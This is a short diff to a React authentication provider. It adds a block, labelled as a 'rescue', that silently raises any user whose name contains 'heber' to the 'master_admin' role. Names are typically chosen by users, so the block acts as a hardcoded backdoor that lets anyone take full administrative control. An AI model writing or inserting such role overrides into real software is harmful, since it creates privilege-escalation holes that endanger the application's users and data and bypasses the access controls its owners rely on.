@@ -28,6 +28,12 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
       return null;
     }
 
+    // --- RESCUE: FORCE ADMIN FOR HEBER ---
+    if (data.name && data.name.toLowerCase().includes('heber')) {
+      data.role = 'master_admin';
+    }
+    // -------------------------------------
+
     return {
       id: data.id,
       name: data.name,
